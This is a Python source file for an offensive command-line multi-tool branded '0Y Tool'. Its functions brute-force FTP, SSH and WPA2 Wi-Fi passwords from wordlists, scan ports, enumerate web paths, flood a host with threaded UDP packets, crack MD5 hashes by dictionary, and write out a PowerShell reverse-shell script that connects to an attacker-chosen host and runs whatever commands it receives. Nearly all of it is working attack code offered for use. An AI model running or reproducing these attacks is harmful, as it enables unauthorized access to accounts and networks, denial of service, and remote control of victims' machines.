import base64
import datetime
import hashlib
import os
import random
import threading
import time

import nmap

try:
    import socket
except:
    os.system("pip install socket")
try:
    from licensing.methods import Helpers, Key
    from licensing.models import *
except:
    os.system("pip install pip-licenses")
    os.system("pip install licensing")
try:
    import paramiko
except:
    os.system("pip install paramiko")
try:
    import argparse
except:
    os.system("pip install argparse")
try:
    from ftplib import FTP
except:
    os.system("pip install ftplib")

try:
    import colorama
except:
    os.system("pip install colorama")

try:
    from pywifi import *
except:
    os.system("pip install pywifi")
try:
    import requests
except:
    os.system("pip install requests")


color = colorama.Fore
date = datetime.datetime.now().time()


def ftp_login(ftp_server, port, username, password, status):
    if port == None:
        port = 21
    num = 0
    ftp = FTP()
    if status == "1,0":
        for user in open(username, "r").read().splitlines():
            date = datetime.datetime.now().time()
            try:
                ftp.connect(ftp_server, port)
                ftp.login(user, password)
                ftp.dir()
                if os.name == "posix":
                    os.system("clear")

                elif os.name == "nt":
                    os.system("cls")

                print(
                    f"""
{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 


{color.WHITE}            username :{color.GREEN} {user} 
{color.WHITE}            password :{color.GREEN} {password}
{color.WHITE}            host     :{color.CYAN} {ftp_server}
{color.WHITE}            port     :{color.YELLOW} {port}
                      """
                )
                exit()
            except:
                print(
                    f"{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE}[{color.RED}Bad Login{color.WHITE}]  {color.YELLOW}{user}{color.WHITE}:{color.YELLOW}{password}"
                )
    elif status == "0,1":
        for pas in open(password, "r").read().splitlines():
            date = datetime.datetime.now().time()
            try:
                ftp.connect(ftp_server, port)
                ftp.login(username, pas)
                ftp.dir()

                if os.name == "posix":
                    os.system("clear")

                elif os.name == "nt":
                    os.system("cls")

                print(
                    f"""
{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 

                         
{color.WHITE}            username :{color.GREEN} {username} 
{color.WHITE}            password :{color.GREEN} {pas}
{color.WHITE}            host     :{color.CYAN} {ftp_server}
{color.WHITE}            port     :{color.YELLOW} {port}
                      """
                )
                exit()
            except:
                print(
                    f"{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE}[{color.RED}Bad Login{color.WHITE}]  {color.YELLOW}{username}{color.WHITE}:{color.YELLOW}{pas}"
                )
    elif status == "1,1":
        for user in open(username, "r").read().splitlines():
            date = datetime.datetime.now().time()
            try:
                password2 = open(password, "r").read().splitlines()[num]
                ftp.connect(ftp_server, port)
                ftp.login(user, password2)
                ftp.dir()

                if os.name == "posix":
                    os.system("clear")

                elif os.name == "nt":
                    os.system("cls")

                print(
                    f"""
{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 

                             
{color.WHITE}            username :{color.GREEN} {user} 
{color.WHITE}            password :{color.GREEN} {password2}
{color.WHITE}            host     :{color.CYAN} {ftp_server}
{color.WHITE}            port     :{color.YELLOW} {port}
                      """
                )
                exit()
            except:
                print(
                    f"{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE}[{color.RED}Bad Login{color.WHITE}]  {color.YELLOW}{user}{color.WHITE}:{color.YELLOW}{password2}"
                )
            num = num + 1


def ssh_login(hostname, port, username, password, status):
    print(
        f"""
{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 

"""
    )
    if port == None:
        port = 22
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    num = 0

    if status == "1,0":
        for user in open(username, "r").read().splitlines():
            date = datetime.datetime.now().time()
            try:
                client.connect(hostname, port=port, username=user, password=password)
                stdout = client.exec_command("whoami")
                if os.name == "posix":
                    os.system("clear")

                elif os.name == "nt":
                    os.system("cls")
                print(
                    f"""
{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 

{color.RED} 
                             
{color.WHITE}            username :{color.GREEN} {user} 
{color.WHITE}            password :{color.GREEN} {password}
{color.WHITE}            host     :{color.CYAN} {hostname}
{color.WHITE}            port     :{color.YELLOW} {port}

                      """
                )
                break
            except:
                print(
                    f"{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE}[{color.RED}Bad Login{color.WHITE}]  {color.YELLOW}{user}{color.WHITE}:{color.YELLOW}{password}"
                )

                client.close()

    elif status == "0,1":
        for pas in open(password, "r").read().splitlines():
            date = datetime.datetime.now().time()
            try:
                client.connect(hostname, port=port, username=username, password=pas)
                stdout = client.exec_command("whoami")
                if os.name == "posix":
                    os.system("clear")

                elif os.name == "nt":
                    os.system("cls")
                print(
                    f"""
{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 

{color.RED} 

{color.WHITE}            username :{color.GREEN} {username} 
{color.WHITE}            password :{color.GREEN} {pas}{color.WHITE}
{color.WHITE}            host     :{color.CYAN} {hostname}
{color.WHITE}            port     :{color.YELLOW} {port}

                      """
                )
                break
            except:
                print(
                    f"{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE}[{color.RED}Bad Login{color.WHITE}]  {color.YELLOW}{username}{color.WHITE}:{color.YELLOW}{pas}"
                )
                client.close()

    elif status == "1,1":
        for pas in open(password, "r").read().splitlines():
            date = datetime.datetime.now().time()
            try:
                username2 = open(username, "r").read().splitlines()[num]
                client.connect(hostname, port=port, username=username2, password=pas)
                stdout = client.exec_command("whoami")
                if os.name == "posix":
                    os.system("clear")

                elif os.name == "nt":
                    os.system("cls")
                print(
                    f"""
{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░  

{color.RED} 
                             
{color.WHITE}            username : {color.GREEN}{username2} 
{color.WHITE}            password : {color.GREEN}{pas}
{color.WHITE}            host     : {color.CYAN}{hostname}
{color.WHITE}            port     : {color.YELLOW}{port}

                      """
                )
                break
            except:
                print(
                    f"{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE}[{color.RED}Bad Login{color.WHITE}]  {color.YELLOW}{username2}{color.WHITE}:{color.YELLOW}{pas}"
                )
                client.close()
        num = num + 1


def nmaP(host=None, port=None):
    if os.name == "posix":
        os.system("clear")

    elif os.name == "nt":
        os.system("cls")
    print(
        f"""{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░  

{color.RED} 
"""
    )
    if port == None:
        top_ports = [
            21,
            22,
            23,
            25,
            53,
            80,
            110,
            111,
            135,
            139,
            143,
            443,
            445,
            993,
            995,
            1723,
            3306,
            3389,
            5900,
            8080,
            8443,
            10000,
            50000,
            32768,
            32769,
            32770,
            32771,
            49152,
            49153,
            49154,
            49155,
            49156,
            49157,
            49158,
            49159,
            49160,
            49161,
            49162,
            49163,
            49164,
            49165,
            49166,
            49167,
            49168,
            49169,
            49170,
            49171,
            49172,
            49173,
            49174,
            49175,
            49176,
            49177,
            49178,
            49179,
            49180,
            49181,
            49182,
            49183,
            49184,
            49185,
            49186,
            49187,
            49188,
            49189,
            49190,
            49191,
            49192,
            49193,
            49194,
            49195,
            49196,
            49197,
            49198,
            49199,
            49200,
            49201,
            49202,
            49203,
            49204,
            49205,
            49206,
            49207,
            49208,
            49209,
            49210,
            49211,
            49212,
            49213,
            49214,
            49215,
            49216,
            49217,
            49218,
            49219,
            49220,
            49221,
            49222,
            49223,
            49224,
        ]
        scann_ports = nmap.PortScanner()
        for porT in top_ports:
            date = datetime.datetime.now().time()
            states = scann_ports.scan(str(host), str(porT))
            if states["scan"][str(host)]["tcp"][porT]["state"] == "open":

                name = states["scan"][str(host)]["tcp"][porT]["name"]
                product = states["scan"][str(host)]["tcp"][porT]["product"]
                version = states["scan"][str(host)]["tcp"][porT]["version"]
                extrainfo = states["scan"][str(host)]["tcp"][porT]["extrainfo"]
                print(
                    f"\r{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE}[{color.GREEN}OPEN{color.WHITE}]  >>{color.YELLOW} TCP{color.WHITE} | {color.GREEN}{porT} {color.WHITE}/ {color.YELLOW} {name} | {product} | {version} | {extrainfo}"
                )
            else:
                print(
                    f"\r{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE}[{color.RED}CLOSE{color.WHITE}] >>{color.RED} {porT} ",
                    end="",
                )
    else:
        scann_ports = nmap.PortScanner()
        states = scann_ports.scan(str(host), str(port))
        if states["scan"][str(host)]["tcp"][port]["state"] == "open":
            date = datetime.datetime.now().time()
            name = states["scan"][str(host)]["tcp"][port]["name"]
            product = states["scan"][str(host)]["tcp"][port]["product"]
            version = states["scan"][str(host)]["tcp"][port]["version"]
            extrainfo = states["scan"][str(host)]["tcp"][port]["extrainfo"]
            print(
                f"\n{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE}[{color.GREEN}OPEN{color.WHITE}] >>{color.YELLOW} TCP{color.WHITE} | {color.GREEN}{port} {color.WHITE}/ {color.YELLOW} {name} | {product} | {version} | {extrainfo}"
            )
        else:
            print(
                f"\r{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE}[{color.RED}CLOSE{color.WHITE}] >>{color.RED} {porT} ",
                end="",
            )


def check(host, pasfile):
    wifi = PyWiFi()
    INF = wifi.interfaces()[0]
    password = open(pasfile, "r").read().splitlines()
    Error = 0
    for passwd in password:
        prof = Profile()
        prof.ssid = host
        prof.auth = const.AUTH_ALG_OPEN
        prof.akm.append(const.AKM_TYPE_WPA2PSK)
        prof.cipher = const.CIPHER_TYPE_CCMP
        prof.key = passwd
        INF.remove_all_network_profiles()
        TEMP_PROF = INF.add_network_profile(prof)
        time.sleep(0.1)
        INF.connect(TEMP_PROF)
        time.sleep(0.4)
        if INF.status() == 4:
            if os.name == "posix":
                os.system("clear")

            elif os.name == "nt":
                os.system("cls")

            print(
                f"""{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 

   """
            )
            print(
                f"\n{color.WHITE}[{color.BLUE}{date}{color.WHITE}] >> {color.GREEN}{host}{color.RED}:{color.GREEN}{passwd}{color.WHITE}\n"
            )
            break
        else:
            Error = Error + 1
            print(
                f"\r{color.WHITE}[{color.BLUE}{date}{color.WHITE}] [{color.RED}NOT TRUE {Error}{color.WHITE}] >> {host}:{passwd}{color.WHITE}",
                end="",
            )


def web_paths(host, path):
    r = requests.session()
    paths = open(path, "r").read().splitlines()
    true_path = []
    for dir in paths:
        date = datetime.datetime.now().time()
        try:
            if "https://" in host:
                web = host + "/"
            elif "http://" in host:
                web = host + "/"
            else:
                web = "https://" + host + "/" + dir
            response = r.get(web, timeout=4).status_code
            if response == 200:
                print(
                    f"\r{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE} >>> {color.GREEN}{web} {color.WHITE}| {color.GREEN}{response}{color.RESET}"
                )
                true_path.append(web)
            elif response == 404:
                print(
                    f"\r{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE} >>> {color.RED}{web} {color.WHITE}| {color.RED}{response}{color.RESET}"
                )
            else:
                print(
                    f"\r{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE} >>> {color.YELLOW}{web} {color.WHITE}| {color.YELLOW}{response}{color.RESET}"
                )
        except:
            break
    for i in true_path:
        date = datetime.datetime.now().time()
        if os.name == "posix":
            os.system("clear")

        elif os.name == "nt":
            os.system("cls")
        print(
            f"""{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
    
    """
        )
        print(
            f"\r{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE} >>> {color.GREEN}{i} {color.WHITE}| {color.GREEN}200{color.RESET}"
        )


def dos(host=None, thread=None, port=None):
    if port == None:
        port = 8080
    if thread == None:
        thread = 999999
    print(host)
    print(port)
    print(thread)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(90240)

    def send_packets():
        while True:
            try:
                date = datetime.datetime.now().time()
                print(
                    f"{color.WHITE}[{color.BLUE}{date}{color.WHITE}]{color.YELLOW} Done Send new requests to {color.GREEN}{host} "
                )
                sock.sendto(data, (host, port))
            except:
                pass

    start_time = time.perf_counter()
    for i in range(thread):
        t = threading.Thread(target=send_packets)
        t.daemon = True
        t.start()


def md5(md5_hasH, file):

    for i in open(file, "r").read().splitlines():
        date = datetime.datetime.now().time()

        text = i
        md5_hash = hashlib.md5()
        md5_hash.update(text.encode())
        md5_hex = md5_hash.hexdigest()
        md5_hex = md5_hex[:32]
        if md5_hasH == md5_hex:
            if os.name == "posix":
                os.system("clear")

            elif os.name == "nt":
                os.system("cls")
            print(
                f"""{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 

"""
            )
            print(f"{color.WHITE}[{color.BLUE}{date}{color.WHITE}]{color.GREEN} {i}")
            break
        else:
            print(
                f"{color.WHITE}[{color.BLUE}{date}{color.WHITE}]{color.RED} {md5_hex}"
            )


def base64_(base64_hasH, file):

    for string_to_encode in open(file, "r").read().splitlines():
        date = datetime.datetime.now().time()
        encoded_string = base64.b64encode(string_to_encode.encode()).decode()
        if base64_hasH == encoded_string:
            if os.name == "posix":
                os.system("clear")

            elif os.name == "nt":
                os.system("cls")
            print(
                f"""{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 

"""
            )
            print(
                f"{color.WHITE}[{color.BLUE}{date}{color.WHITE}]{color.GREEN} {string_to_encode}"
            )
            break
        else:
            print(
                f"{color.WHITE}[{color.BLUE}{date}{color.WHITE}]{color.RED} {encoded_string}"
            )


def powershell(lhost, port, name):
    print(lhost)
    date = datetime.datetime.now().time()
    value = str(
        """Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('"""
        + str(lhost)
        + """',"""
        + str(port)
        + """));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
    )
    if ".ps1" in name:
        open(name, "w").write(value)
    else:
        name = name + ".ps1"
        open(str(name), "w").write(value)

    path = os.path.join(os.getcwd(), name)
    if os.name == "posix":
        os.system("clear")

    elif os.name == "nt":
        os.system("cls")
    print(
        f"""{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 

"""
    )
    print(f"{color.WHITE}[{color.BLUE}{date}{color.WHITE}]{color.GREEN} {path}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-ho", "--host", type=str)
    parser.add_argument("-lho", "--lhost", type=str)
    parser.add_argument("-u", "--user", type=str)
    parser.add_argument("-pf", "--pfile", type=str)
    parser.add_argument("-uf", "--ufile", type=str)
    parser.add_argument("-ps", "--pas", type=str)
    parser.add_argument("-t", "--type", type=str)
    parser.add_argument("-p", "--port", type=int)
    parser.add_argument("-pfi", "--passfi", type=str)
    parser.add_argument("-fp", "--fipath", type=str)
    parser.add_argument("-d", "--dos", type=str)
    parser.add_argument("-th", "--thash", type=str)
    parser.add_argument("-hs", "--hash", type=str)
    parser.add_argument("-fh", "--fhash", type=str)
    parser.add_argument("-po", "--pshell", type=str)
    parser.add_argument("-n", "--name", type=str)

    args = parser.parse_args()

    if str(args.type).upper() == "SSH":
        if args.ufile and args.pas:
            ssh_login(args.host, args.port, args.ufile, args.pas, status="1,0")
        elif args.pfile and args.user:
            ssh_login(args.host, args.port, args.user, args.pfile, status="0,1")
        elif args.pfile and args.ufile:
            ssh_login(args.host, args.port, args.ufile, args.pfile, status="1,1")
    elif str(args.pshell).upper() == "TRUE":
        if args.name:
            powershell(args.lhost, args.port, args.name)
        else:
            powershell(args.lhost, args.port, "shell.ps1")

    elif str(args.thash).upper() == "MD5":
        md5_hash = args.hash
        file = args.fhash
        md5(md5_hash, file)

    elif str(args.thash).upper() == "BASE64":
        base64_hash = args.hash
        file = args.fhash
        base64_(base64_hash, file)

    elif str(args.dos).upper() == "TRUE":
        if args.port:
            if "," in args.host:
                thread = args.host.split(",")[1]
                host = args.host.split(",")[0]
                dos(host=host, thread=int(thread), port=args.port)
            else:
                dos(host=args.host, port=args.port)
        else:
            if "," in args.host:
                thread = args.host.split(",")[1]
                host = args.host.split(",")[0]
                dos(host=host, thread=int(thread))
            else:
                dos(host=args.host)
    elif str(args.type).upper() == "FTP":
        if args.ufile and args.pas:
            ftp_login(
                username=args.ufile,
                password=args.pas,
                ftp_server=args.host,
                port=args.port,
                status="1,0",
            )
        elif args.pfile and args.user:
            ftp_login(
                username=args.user,
                password=args.pfile,
                ftp_server=args.host,
                port=args.port,
                status="0,1",
            )
        elif args.ufile and args.pfile:
            ftp_login(
                username=args.ufile,
                password=args.pfile,
                ftp_server=args.host,
                port=args.port,
                status="1,1",
            )
    elif str(args.type).upper() == "SCAN":
        if args.port:
            nmaP(host=args.host, port=args.port)
        else:
            nmaP(host=args.host)

    elif str(args.type).upper() == "GETFI":
        if os.name == "posix":
            os.system("clear")

        elif os.name == "nt":
            os.system("cls")
        print(
            f"""{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
   
   """
        )
        wifi = PyWiFi()
        INF = wifi.interfaces()[0]
        INF.scan()
        Rscan = INF.scan_results()
        num_net = 0
        for network in Rscan:
            num_net = num_net + 1
            print(
                f"""
{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE}[{color.RED}{num_net}{color.WHITE}] >>> {color.GREEN} {network.ssid} {color.RESET}
             
             """
            )

    elif str(args.type).upper() == "CHECKFI":
        check(args.host, args.passfi)

    elif args.fipath:
        web_paths(args.host, args.fipath)
    else:
        if os.name == "posix":
            os.system("clear")

        elif os.name == "nt":
            os.system("cls")
        print(color.CYAN)
        print(
            f"""{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
